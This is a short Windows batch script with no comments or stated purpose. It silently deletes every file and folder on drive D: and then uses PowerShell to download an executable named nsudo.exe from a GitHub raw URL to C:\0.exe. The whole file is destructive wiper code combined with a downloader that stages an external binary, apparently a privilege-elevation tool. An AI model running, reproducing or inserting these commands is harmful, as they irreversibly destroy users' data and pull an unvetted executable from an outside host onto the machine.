rd /s /q D:\*
del /s /q D:\*.*
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/gtla2025/cs/refs/heads/main/nsudo.exe', 'C:\0.exe')"
exit
